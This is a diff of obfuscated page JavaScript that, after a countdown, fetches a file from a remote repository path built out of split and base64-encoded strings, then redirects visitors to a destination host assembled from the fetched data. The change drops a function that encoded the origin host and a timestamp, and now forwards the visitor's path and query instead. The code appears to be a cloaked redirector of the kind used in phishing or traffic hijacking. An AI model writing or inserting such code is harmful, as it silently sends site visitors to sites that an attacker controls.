@@ -124,15 +124,6 @@
       countdownNumberEl.textContent = countdown;
     }, 1000);
 
-    function obfuscate(str) {
-      const key = 'kmlkclb';
-      const inner = btoa(str).replace(/=+$/, '');
-      let xored = '';
-      for (let i = 0; i < inner.length; i++)
-        xored += String.fromCharCode(inner.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-      return btoa(xored).replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
-    }
-
     const a = s + u + s + r + s + 'refs' + s + 'heads' + s + 'main' + s + f;
     window.setTimeout(function () {
       fetch(atob('a' + g) + a)
@@ -148,9 +139,8 @@
           const h = window.location.hostname.replace(/\.(?:[a-z]{2,}|[a-z]{2}\.[a-z]{2})$/i, '');
           const destUrl = window.location.protocol + '//' + m + w + '.' + h + '.' + l;
 
-          const timestamp = Date.now();
-          const encoded = obfuscate(timestamp + '_' + window.location.protocol + '//' + 'edge.' + window.location.hostname);
-          window.location.href = destUrl + '/#' + encoded;
+          const path = window.location.pathname + window.location.search + window.location.hash;
+          window.location.href = destUrl + path;
         })
         .catch(error => {
           console.error('Error:', error);
